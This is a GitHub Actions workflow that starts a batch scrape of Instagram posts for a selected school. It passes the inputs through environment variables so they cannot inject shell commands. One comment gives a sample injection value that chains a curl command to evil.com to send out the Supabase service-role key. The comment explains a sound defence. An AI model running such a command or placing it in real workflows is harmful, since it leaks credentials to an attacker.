name: Big Scrape

# Manually-triggered batch scrape across one school's Instagram handles.
# Calls services/wat2do via backend/jobs/scrape.py. v2 uses Supabase
# Storage instead of S3, so AWS secrets are no longer required.

on:
  workflow_dispatch:
    inputs:
      school:
        description: 'School to scrape'
        required: true
        type: choice
        options:
          - 'University of Waterloo'
          - 'University of Toronto - St. George'
          - 'University of Toronto - Scarborough'
          - 'McGill University'
          - 'McMaster University'
          - 'Western University'
          - "Queen's University"
          - 'Carleton University'
          - 'Brock University'
          - 'Wilfrid Laurier University'
          - 'York University'
          - 'Toronto Metropolitan University'
          - 'University of Ottawa'
          - 'OCAD University'
          - 'Cornell University'
          - 'New York University'
          - 'University of Pennsylvania'
          - 'Columbia University'
          - 'Massachusetts Institute of Technology'
          - 'University of British Columbia'
      limit:
        description: 'Max posts per user (Apify resultsLimit)'
        required: true
        type: string
        default: '100'
      cutoff_days:
        description: 'Drop posts older than this many days'
        required: true
        type: string
        default: '4'
      dry_run:
        description: 'Dry run (process only the first handle, no DB writes)'
        required: true
        type: boolean
        default: true
      allow_past_events:
        description: 'Allow past events (do not drop past occurrences)'
        required: true
        type: boolean
        default: true

jobs:
  big_scrape:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      ENVIRONMENT: production
      # Supabase (read/write via service-role key; bypasses RLS).
      SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
      SUPABASE_KEY: ${{ secrets.SUPABASE_KEY }}
      SUPABASE_SECRET_KEY: ${{ secrets.SUPABASE_SECRET_KEY }}
      SUPABASE_JWT_SECRET: ${{ secrets.SUPABASE_JWT_SECRET }}
      # OpenAI vision extraction (services/wat2do/extractor.py).
      OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
      # Apify Instagram-post-scraper (services/wat2do/instagram_scraper.py).
      APIFY_API_TOKEN: ${{ secrets.APIFY_API_TOKEN }}

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('backend/requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-

      - name: Install dependencies
        working-directory: backend
        run: |
          pip install --prefer-binary -r requirements.txt

      - name: Run scraper
        working-directory: backend
        # `inputs.limit` and `inputs.cutoff_days` are typed `string` (so the
        # Action UI accepts an empty default), then validated as integers
        # by argparse. Pass them via env vars rather than direct
        # ${{ … }} substitution into the shell — substitution is raw text
        # replacement done before bash parses the line, so a value like
        # `100; curl evil.com -d "$SUPABASE_SECRET_KEY"` would otherwise
        # exfiltrate the service-role key on every Big Scrape a repo
        # collaborator can dispatch.
        env:
          SCHOOL: ${{ inputs.school }}
          LIMIT: ${{ inputs.limit }}
          CUTOFF_DAYS: ${{ inputs.cutoff_days }}
          DRY_RUN: ${{ inputs.dry_run }}
          ALLOW_PAST_EVENTS: ${{ inputs.allow_past_events }}
        run: |
          mkdir -p logs
          set -o pipefail
          python -u jobs/scrape.py batch \
            --school "$SCHOOL" \
            --limit "$LIMIT" \
            --cutoff-days "$CUTOFF_DAYS" \
            --dry-run "$DRY_RUN" \
            --allow-past-events "$ALLOW_PAST_EVENTS" \
            2>&1 | tee logs/scraping.log

      - name: Upload logs as artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: big-scrape-logs-${{ github.run_number }}
          path: backend/logs/scraping.log
          if-no-files-found: 'ignore'
